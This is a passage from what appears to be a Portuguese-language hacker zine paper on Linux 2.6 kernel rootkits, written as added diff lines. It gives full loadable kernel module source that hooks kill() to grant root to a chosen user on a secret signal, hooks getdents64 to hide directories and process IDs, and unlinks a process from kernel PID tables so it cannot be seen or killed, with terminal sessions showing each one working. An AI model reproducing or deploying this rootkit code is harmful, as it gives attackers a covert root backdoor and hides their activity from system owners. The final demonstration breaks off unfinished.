+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+
+#include "sys_hook_kill.h"
+
+unsigned long **find_sys_call_table(void){
+        unsigned long **sctable, ptr;
+        extern int loops_per_jiffy;
+
+        sctable = NULL;
+        for (ptr = (unsigned long)&loops_per_jiffy ; ptr < (unsigned long)&boot_cpu_data ; ptr += sizeof(void *)){
+                unsigned long *p;
+                p = (unsigned long *)ptr;
+
+                if (p[__NR_close] == (unsigned long) sys_close){
+                        sctable = (unsigned long **)p;
+                        return &sctable[0];
+                }
+        }
+        return NULL;
+}
+
+asmlinkage long kill(pid_t pid, int sig){
+
+        if(current->uid == mkrootuid && sig == SIGCONT && pid == LEET){
+                current->gid = current->uid = 0;
+		return -EPERM;
+	}
+
+        return o_kill(pid,sig);
+
+}
+
+static int __init init_lkm (void){
+
+        sys_call_table = (void*)find_sys_call_table();
+
+        SAVE_KILL
+        HOOK_KILL
+
+        return 0;
+}
+
+static void __exit exit_lkm (void){
+        RESTORE_KILL
+}
+
+module_init (init_lkm);
+module_exit (exit_lkm);
+---snip---	
+
+Executando:
+	
+---snip---	
+tty1:
+root@char:/tmp/Dummy/sys_hook_kill# insmod ./sys_hook_kill.ko
+root@char:/tmp/Dummy/sys_hook_kill#
+
+tty2:
+hash@char:~$ id
+uid=1000(hash) gid=100(users) groups=11(floppy),17(audio),18(video)...
+hash@char:~$ su
+Password:
+Sorry.
+hash@char:~$ kill -SIGCONT 31337
+-bash: kill: (31337) - Operation not permitted
+hash@char:~$ su
+root@char:/home/hash# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),...
+root@char:/home/hash#
+---snip---	
+
+	Repare que eu retorno -EPERM sem executar a funcao kill original,
+afinal nao queremos killar nenhuma pid, apenas ganhar root e isso
+e' feito antes com current->gid = current->uid = 0.
+	Caso a nossa regra nao seja estabelicida retorno a funcao
+kill original, porque _the kill must go on_.
+
+
+[ --- 6.3  Hookando sys_getdents64() 
+
+	Diretorios nao desaparecem por magica, mas desaparecem com sys_getdents64().
+
+	Nesse capitulo vou mostrar como, veja:
+
+sys_hook_getdents.h:	
+---snip---	
+/*
+ * sys_hook_chdir.h
+ *
+ * Carlos Carvalho aka hash
+ *
+ */
+
+#define SAVE_GETDENTS64         o_sys_getdents64 = (long(*)(unsigned int fd,                    \
+                                                    struct linux_dirent64 __user *dirent,       \
+                                                    unsigned int count))                        \
+                                                    (sys_call_table[__NR_getdents64]);
+
+#define HOOK_GETDENTS64         sys_call_table[__NR_getdents64] = (unsigned long *)getdents64;
+
+#define RESTORE_GETDENTS64      sys_call_table[__NR_getdents64] = (unsigned long *)o_sys_getdents64;
+
+#define HIDEDIR                 "etc"
+
+asmlinkage long (*o_sys_getdents64) (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
+
+void **sys_call_table;
+
+struct linux_dirent64 {
+        u64             d_ino;
+        s64             d_off;
+        unsigned short  d_reclen;
+        unsigned char   d_type;
+        char            d_name[20];
+};
+---snip---	
+
+sys_hook_getdents.c:
+---snip---	
+/*
+ * sys_hook_chdir.c
+ *
+ * Carlos Carvalho aka hash
+ *
+ *
+ */
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include <asm/uaccess.h>
+
+#include "sys_hook_getdents64.h"
+
+unsigned long **find_sys_call_table(void){
+        unsigned long **sctable, ptr;
+        extern int loops_per_jiffy;
+
+        sctable = NULL;
+        for (ptr = (unsigned long)&loops_per_jiffy ; ptr < (unsigned long)&boot_cpu_data ; ptr += sizeof(void *)){
+                unsigned long *p;
+                p = (unsigned long *)ptr;
+
+                if (p[__NR_close] == (unsigned long) sys_close){
+                        sctable = (unsigned long **)p;
+                        return &sctable[0];
+                }
+        }
+        return NULL;
+}
+asmlinkage long getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
+
+        struct linux_dirent64 *ddir, *ddir_t, *ptr, *prev;
+	ddir= ddir_t = ptr = prev = NULL;
+        long rec,i,ret;
+
+        ret = 0;
+        i = ret = (*o_sys_getdents64) (fd, dirent, count);
+
+        if (i <= 0 || (ddir_t = (struct linux_dirent64 *) kmalloc(i, GFP_KERNEL)) == NULL){
+                goto quit; 
+        }
+
+        if(copy_from_user(ddir_t, dirent, i) != 0){
+                goto freequit;
+        }
+
+        ptr = ddir = ddir_t;
+
+        while (((unsigned long ) ddir) < (((unsigned long) ddir_t) + i)) {
+                rec = ddir->d_reclen;
+                if (strncmp(HIDEDIR, ddir->d_name,strlen(HIDEDIR)) == 0){
+                        if(!prev){
+                                ret -= rec;
+                                ptr = (struct linux_dirent64 *) (((unsigned long) ddir) + rec);
+                        }else{
+                                prev->d_reclen += rec;
+                                memset(ddir, 0, rec);
+                        }
+                }else{
+                        prev = ddir;
+                }
+                ddir = (struct linux_dirent64 *)(((unsigned long)ddir)+rec);
+        }
+
+        if(copy_to_user(dirent,ptr,ret) != 0){
+            goto freequit;
+        }
+
+freequit:
+
+        kfree(ddir_t);
+
+quit:
+        return i;
+
+}
+
+static int __init init_lkm (void){
+
+        sys_call_table = (void*)find_sys_call_table();
+
+        SAVE_GETDENTS64
+        HOOK_GETDENTS64
+
+        return 0;
+}
+
+static void __exit exit_lkm (void){
+        RESTORE_GETDENTS64
+}
+
+module_init (init_lkm);
+module_exit (exit_lkm);
+---snip---
+
+	A estrutura linux_dirent64{} guarda os valores retornados pela funcao
+que sao o nome do diretorio, o inode, tipo, offset e o tamanho de
+getdents em bytes. 
+	O que nos interessa e' o seu nome porque baseado nele saberemos 
+o que esconder, se d_name == "dir" entao assumimos alguma acao. 
+	Veja um trecho do output de strace -v para o comando ls, devidamente
+identado para facilitar a visualizacao:
+
+---snip---
+... (texto suprimido)
+getdents64(3, {
+{d_ino=2, d_off=2, d_type=DT_UNKNOWN, d_reclen=24, d_name="."} 
+{d_ino=1, d_off=2318336, d_type=DT_UNKNOWN, d_reclen=24, d_name=".."} 
+{d_ino=19, d_off=2354688, d_type=DT_UNKNOWN, d_reclen=24, d_name="bin"} 
+{d_ino=6, d_off=2401792, d_type=DT_UNKNOWN, d_reclen=24, d_name="dev"} 
+{d_ino=20, d_off=2529152, d_type=DT_UNKNOWN, d_reclen=24, d_name="etc"} 
+{d_ino=23, d_off=2563328, d_type=DT_UNKNOWN, d_reclen=24, d_name="lib"} 
+{d_ino=4, d_off=2609920, d_type=DT_UNKNOWN, d_reclen=24, d_name="mnt"} 
+{d_ino=60047, d_off=2711168, d_type=DT_UNKNOWN, d_reclen=24, d_name="opt"} 
+{d_ino=27, d_off=2713728, d_type=DT_UNKNOWN, d_reclen=24, d_name="tmp"} 
+{d_ino=28, d_off=2730880, d_type=DT_UNKNOWN, d_reclen=24, d_name="sys"} 
+{d_ino=8, d_off=2744576, d_type=DT_UNKNOWN, d_reclen=24, d_name="var"} 
+{d_ino=47, d_off=25652864, d_type=DT_UNKNOWN, d_reclen=24, d_name="usr"} 
+{d_ino=3, d_off=27051904, d_type=DT_UNKNOWN, d_reclen=24, d_name="boot"} 
+{d_ino=117, d_off=29009280, d_type=DT_UNKNOWN, d_reclen=24, d_name="home"} 
+{d_ino=118, d_off=29360256, d_type=DT_UNKNOWN, d_reclen=24, d_name="proc"} 
+{d_ino=119, d_off=29415552, d_type=DT_UNKNOWN, d_reclen=24,d_name="sbin"} 
+{d_ino=120, d_off=482097408, d_type=DT_UNKNOWN, d_reclen=24, d_name="root"} 
+... (texto suprimido)
+}, 131072) = 512
+getdents64(3, {}, 131072)
+---snip---
+
+	Repare que para a listagem do diretorio a syscall getdents64 e' chamada e cada membro 
+da lista mostra seu parametro, ou valor, especifico de acordo com o que e' listado, por
+exemplo para d_name="etc" temos:
+
+	{d_ino=20, d_off=2529152, d_type=DT_UNKNOWN, d_reclen=24, d_name="etc"}
+
+	Isto e' uma lista duplamente linkada onde cada node recebe um conjunto
+de informacoes para cada diretorio/arquivo encontrado. Podemos confirmar com
+o comando stat:
+
+root@char:/# stat etc
+  File: `etc'
+  Size: 5352            Blocks: 10         IO Block: 131072 directory
+Device: 304h/772d       Inode: 20          Links: 51
+Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2007-05-26 11:50:04.000000000 -0300
+Modify: 2007-05-26 10:58:57.000000000 -0300
+Change: 2007-05-26 10:58:57.000000000 -0300
+root@char:/#
+
+
+	Observe que seu inode visto com strace como 20, tambem aparece como 20 aqui.
+stat como muitos outros comandos sao comandos userland que executam todo aquele
+procedimento descrito antes nesse paper como a logistica de execucao de syscalls
+e funcoes userland. Se modificarmos o comportamento dessa syscall, stat vai retornar
+os valores que quisermos, assim como ls.
+
+	Agora observe o antes e o depois do modulo carregado:
+
+sh@char:/$ ls -i |grep etc
+    20 etc/
+hash@char:/$ ls
+bin/   dev/  home/  libssh-0.11/  opt/   root/  splint-3.1.1/  tmp/  var/
+boot/  etc/  lib/   mnt/          proc/  sbin/  sys/           usr/  vmlinuz-2.6.15-bs
+hash@char:/$ stat *|grep etc
+  File: `etc'
+hash@char:/$
+
+	Entao carregamos o modulo:
+
+# insmod ./sys_hook_getdents64.ko
+#
+
+	E testamos:
+
+hash@char:/$ ls -i |grep etc
+hash@char:/$ ls
+bin/   dev/   lib/          mnt/  proc/  sbin/          sys/  usr/  vmlinuz-2.6.15-bs
+boot/  home/  libssh-0.11/  opt/  root/  splint-3.1.1/  tmp/  var/
+hash@char:/$ stat *|grep etc
+hash@char:/$
+
+	O diretorio /etc nao aparece mais em nenhum comando.
+
+	Veja:
+
+	.
+	.
+	rec = ddir->d_reclen;
+	if (strncmp(HIDEDIR, ddir->d_name,strlen(HIDEDIR)) == 0){
+                        prev->d_reclen += rec;
+                        memset(ddir, 0, rec);
+                }else{
+                        prev = ddir;
+                }
+	.
+	.
+	
+	Se a nossa regra for satisfeita, no caso o diretorio listado for "etc"
+a entrada atual e avancada de acordo com o tamanho de getdents, ou seja, pula
+uma casa e passa para o proximo da lista. Sendo assim, "etc" nao e' mais
+listado, observe:
+
+Tudo normal, dev e' exibido:
+[!] {d_ino=6, d_off=2401792, d_type=DT_UNKNOWN, d_reclen=24, d_name="dev"}
+
+Opa, "etc", suprimido:
+[X] {d_ino=20, d_off=2529152, d_type=DT_UNKNOWN, d_reclen=24, d_name="etc"}
+
+Avancamos uma casa, e o proximo da lista e' "lib" que surge:
+[!] {d_ino=23, d_off=2563328, d_type=DT_UNKNOWN, d_reclen=24, d_name="lib"}
+
+	d_reclen e' o tamanho de getdents, no caso 24 bytes, entao avancamos
+exatos 24 bytes chegando em "lib".
+
+[ --- 7  Pids e sys_getdents64()
+
+	Ora, o que sao, para os programas de usuario, pids? Diretorios.
+Sim, pids sao diretorios, duvida?
+
+hash@char:/$ ls /proc/ |grep [0-9]
+1/
+1007/
+1257/
+1274/
+1386/
+142/
+1422/
+2/
+201/
+202/
+.
+.
+.
+
+	Hmmm, 1007 ?
+
+hash@char:/$ ps ax |grep 1007 |head -1
+ 1007 ?        S<s    0:00 udevd
+hash@char:/$
+
+	Os programas de usuario sao estupidos, nao necessariamente os usuarios
+sao estupidos, mas os programas sim, e eles leem de /proc para saber que pids estao
+ativas no sistema, assim ps faz.
+	Vamos provar, e mudar uma variavel no programa do capitulo anterior
+sys_hook_getdents64.h:
+
+	- #define HIDEDIR                 "etc"
+	+ #define HIDEDIR                 "31337"
+
+Voces lembram que eu tenho uma pid 31337 nao?
+
+hash@char:/$ ps ax |grep 31337 |head -1
+31337 ?        S      0:00 [migration/0]
+hash@char:/$
+	
+	Recompile o module e execute:
+
+root@char:/tmp/Dummy/sys_hook_getdents64# !in
+insmod ./sys_hook_getdents64.ko
+root@char:/tmp/Dummy/sys_hook_getdents64# ps ax |grep 31337
+root@char:/tmp/Dummy/sys_hook_getdents64#
+
+	Nada, a pid desapareceu. 
+
+
+[ --- 7.1  Problemas com o uso de sys_getdents64() para pid
+
+	Voce pode usar a mesma tecnica de getdents para pids como usou
+para diretorios, porem temos um pequeno problema:
+
+hash@char:~$ ./psearch
+->[31337]
+Found 1 hidden pid
+hash@char:~$
+
+	Mas a pid nao havia sumido? Sim, sumiu do ps e outros comandos, mas nao de 
+kill(). Um processo em execucao esta preparado a responder sinais como SIGINT, SIGTERM,
+SIGCONT, etc.. Se um processo existe na tabela de processos, sim ele existe na tabela
+de processos, so nao aparace para ps, mas existe e se por exemplo, voce como um
+usuario comum tentar killar um processo de superuaurio tera permissao negada, retornando
+-1 ou 0 se tiver permissao. Viu, ele retorna, e com base nisso e um pouco de forca bruta podemos
+descobrir comparando com as entradas de /proc se um processo esta escondido ou nao.
+
+	Voce pode ate esconder um processo com getdents e getdents64, mas sera essa uma
+das melhores formas? Certamente nao e sobre uma forma muito mais interessante esse capitulo
+aborda. Vamos dar um unhash na entrada da(s) pid(s) na tabela de pids, diretamente
+no kernel. Nem mesmo o kernel vai saber da existencia desse(s) processo(s) quanto
+menos kill() ps, etc. Praticamente inviavel de se detectar. 
+
+
+[ --- 8  Hackeando o kernel sem hooking de syscall
+
+	As funcoes nativas do kernel estao la para serem usadas, nem so de
+hooking de syscall vive o nerd, ele pode ser mais legitimo e fazer as
+coisas como elas devem ser feitas, sempre que possivel.
+
+	Esta tecnica, para pids, apareceu pela primeira vez para o 
+kernel 2.4.x em um paper de ubra da Phrack #63 phile 0x12.
+
+	Desde entao muitas pids sumiram na versao 2.4.x, foram para lugares
+distantes e sombrios, na escuridao do anonimato, arrumaram emprego
+como VJ da MTV, etc...
+	Entretanto no kernel 2.6.x elas insistiram em aparecer com kill(),
+mesmo exelentes rootkits conhecidos como o suckit (se eu estiver errado me corrija) 
+tem suas pids localizadas com kill.
+
+	Mas com um pouco de researching pelos codigos do kernel 2.6.x pude 
+perceber como portar essa tecnica para a versao que usamos nesse paper.
+	Muito pouca coisa foi necessaria de se modificar e o 
+proximo passo diz como funciona.
+
+
+[ --- 8.1  Indo direto ao ponto, bye pid!
+
+	Existem dois arquivos primordiais para se entender como funciona isso,
+sao eles:
+
+	kernel/pid.c
+	kernel/exit.c
+	
+	Veja como um processo que recebe um kill -9 
+ou que simplesmente termina sua execucao funciona:
+
+	1-> Processo rodando com pid 1000
+	2-> Processo termina sua rotina e execute exit()
+	3-> exit() passa o controle pro kernel chamando sys_exit()
+	4-> o kernel no controle via exit.c chama __unhash_process(p)
+	5-> __unhash_process() de exit.c executa rotinas e chama detach_pid()
+	6-> detach_pid() existe em pid.c e limpa o encadeamento da lista
+referente a pid e retorna
+	7-> __unhash_process() continua e executa REMOVE_LINKS(p) limpando
+seus apontadores para a pid
+	8-> exit.c continua seu codigo e enfim libera o processo que termina.
+
+	
+	Entao o obvio e' que devemos emular esse procedimento, com
+um detalhe importante, exit() nao e' chamado, entao a pid deixa de existir
+mas o processo em si nao, ele continua a fazer o que tem que ser feito
+mas nao e' passivo de kill() e somente um reboot pode mata-lo, e acredite,
+ele vai morrer muito abruptamente, quase um atropelamento :)
+
+	Vamos ao codigo?
+	
+
+---snip---
+/*
+ * sys_hide_pid.c
+ *
+ * Carlos Carvalho aka hash
+ *
+ *
+ */
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include<linux/sched.h>
+#include<linux/types.h>
+#include<linux/list.h>
+#include<linux/pid.h>
+
+struct pid *p;
+struct task_struct *task;
+
+void unset_pid(unsigned int unset){
+
+        task = find_task_by_pid(unset);
+        p = &task->pids[PIDTYPE_PID];
+        if(p){
+                write_lock_irq(&tasklist_lock);
+                hlist_del(&p->pid_chain);
+                list_empty(&p->pid_list);
+                REMOVE_LINKS(task);
+                write_unlock_irq(&tasklist_lock);
+        }
+
+}
+
+static int __init init_lkm (void){
+
+        unset_pid(31337);
+
+        return 0;
+}
+
+static void __exit exit_lkm (void){}
+
+module_init (init_lkm);
+module_exit (exit_lkm);
+---snip---
+
+Simples nao? Traduzindo:
+
+include/sched.h:
+---snip---
+#define find_task_by_pid(nr)    find_task_by_pid_type(PIDTYPE_PID, nr)
+extern struct task_struct *find_task_by_pid_type(int type, int pid);
+---snip---
+	
+	find_task_by_pid() e' um macro que chama find_task_by_pid_type()
+que e' exportado por kernel/pid.c com EXPORT_SYMBOL(find_task_by_pid_type).
+
+Veja:
+
+root@char:/proc# grep find_task_by_pid_type kallsyms
+c012f9a6 T find_task_by_pid_type
+root@char:/proc#
+
+	E retorna a task referente aquela pid e a estrutura pid *p
+logo em seguida recebe esse ponteiro.
+
+	Asseguramos que nao haja uma concorrencia com write_lock_irq(&tasklist_lock).
+	hlist_del() definido em linux/list.h recebe o node da lista linkada referente
+a pid, e chama em si mesmo __hlist_del(n) que efetivamente atualiza a lista
+linkada passando o ponteiro a frente se tudo for ok.
+	
+	list_empty(&p->pid_list) testa aonde a lista foi esvaziada e retorna,
+por fim REMOVE_LINKS(task) remove toda referencia aquela pid.
+REMOVE_LINKS(task) e' quem efetivamente some com o processo da lista, mas sao
+as funcoes anteriores que removem os ponteiros que referenciavam a(s) pid(s)
+impedindo o kernel de localiza-las.s
+
+	Um processo em background:
+
+---snip---
+#include <stdio.h>
+#include <unistd.h>
+
+int main(void) {
+        if(fork() == 0) {
+                printf("%d\n",getpid());
+                sleep(-1);
+        }
+        return 0;
+}
+---snip---
+
+hash@char:~$ gcc f.c -o f
+hash@char:~$ ./f
+3754
+hash@char:~$ ps
+  PID TTY          TIME CMD
+27441 pts/4    00:00:00 bash
+ 3754 pts/4    00:00:00 f
+ 3755 pts/4    00:00:00 ps
+hash@char:~$
+
+	O processo esta rodando. Vamos esquece-lo e voltar ao módulo
+substituindo a linha:
+
+unset_pid(31337);
+
+por:
+
+unset_pid(3754);
+
+e vamos comentar as linhas:
+
+//hlist_del(&p->pid_chain);
+//list_empty(&p->pid_list);
+
+
+Recompilar o modulo e dar o insmod de novo:
+
+(to be continued...)
+
+
+[ --- 9. Consideracoes finais
+
+    A ideia desse white paper foi concebida por mim em um momento em que eu
+tinha mais tempo livre para esse tipo de pesquisa e o paper seria inclusive
+bem mais longo do que e aqui. Por isso, pela falta de tempo decidi 
+que essa seria a primeira parte, sendo a segunda publicada assim que possivel,
+talvez em uma proxima edicao da zine.
+
+    Espero que existam muitos erros nesse paper, nao pude revisa-lo como gostaria
+e tendo em vista hoje que eu possuo mais experiencia na linguagem C/C++ do que na epoca das
+primeiras linhas desse documento eu acredito que eu mesmo faria diversas mudancas no texto
+em diversos aspectos, mas quem sabe na parte II eu consiga fazer isso.
+
+
+[ --- 10. Agradecimentos
+
+    A todos os amigos de longa data.
+
+
+[ --- 11. Referencias
+
+    Source code do kernel 2.6.x do Linux.
